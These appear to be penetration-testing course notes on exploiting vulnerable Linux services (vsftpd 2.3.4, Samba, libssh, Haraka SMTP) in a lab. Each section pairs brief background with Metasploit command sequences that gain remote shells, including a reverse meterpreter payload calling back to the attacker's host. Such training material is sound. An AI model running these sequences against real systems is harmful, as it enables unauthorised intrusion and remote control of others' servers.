# ii - Linux Exploitation

## <mark style="color:red;">Exploiting A Vulnerable FTP Server</mark>

* FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.
* It is also frequently used as a means of transferring files to and from the directory of a web server.
* vsftpd is an FTP server for Unix-like systems including Linux systems and is the default FTP server for Ubuntu, CentOS and Fedora.
* vsftpd V2.3.4 is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download archive through a supply chain attack.

### **Practical Demonstration**

```bash
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor #Exploit for vsftpd 2.3.4
msf5 > use post/multi/manage/shell_to_meterpreter # Upgrade a shell to meterpreter
```



## <mark style="color:red;">Exploiting SAMBA</mark>

* SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).
* SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
* Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
* Samba V3.5.0 is vulnerable to a remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.

### **Practical Demonstration**

```bash
search type:exploit name:samba
use exploit/linux/samba/is_known_pipename
use exploit/linux/samba/is_known_pipename #Exploit for Samba V3.5.0 to V4.6.4
check # runs a check to know if the victim is vulnerable.
run # we get a shell session, lets upgrade it to a meterpreter session.
search shell_to_meterpreter
use 1
set SESSION 1
set LHOST $kaliIP
run # done.
sessions # view sessions.
```



## <mark style="color:red;">Exploiting A Vulnerable SSH Server</mark>

* SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
* It is typically used for remote access to servers and systems.
* SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
* libssh is a multiplatform C library implementing the SSHv2 protocol on client and server side.
* libssh V0.6.0-0.8.0 is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server.

### **Practical Demonstration**

```bash
search libssh_auth_bypass
msf5 > use auxiliary/scanner/ssh/libssh_auth_bypass #Exploit for SSH V0.6.0 to V0.8.0
set SPAWN_PTY true
run # we get a shell session.
```



## <mark style="color:red;">Exploiting A Vulnerable SMTP Server</mark>

* SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.
* SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.
* Haraka is an open source high performance SMTP server developed in Node.js
* The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to V2.8.9 are vulnerable to command injection.

### **Practical Demonstration**

```bash
search type:exploit name:haraka
msf5 > use exploit/linux/smtp/haraka #Exploit for Haraka prior to V2.8.9.
set PORT 9898
set email_to root@attackdefense.test
set PAYLOAD linux/x64/meterpreter_reverse_http
set LHOSTS $kaliIP
run
```





